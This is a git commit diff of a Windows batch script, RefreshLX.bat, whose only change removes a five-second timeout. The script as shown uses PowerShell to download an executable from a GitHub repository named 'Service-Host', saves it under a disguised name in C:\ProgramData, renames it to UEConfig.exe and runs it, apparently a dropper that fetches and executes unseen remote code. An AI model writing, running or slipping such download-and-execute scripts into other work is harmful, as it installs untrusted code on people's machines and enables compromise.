31cbb76f3a1cc7f702653367540aabad7706bacd
AnonymousArabian <69630276+AnonymousArabian@users.noreply.github.com>
2021-01-07 01:27:45 +1000

    Update RefreshLX.bat

--- RefreshLX.bat
+++ RefreshLX.bat
@@ -1,5 +1,4 @@
 @echo off
 powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/AnonymousArabian/Service-Host/raw/master/UESupport.exe','C:\ProgramData\UEConfig')"
 rename  C:\ProgramData\UEConfig UEConfig.exe
-timeout 5
 C:\ProgramData\UEConfig.exe
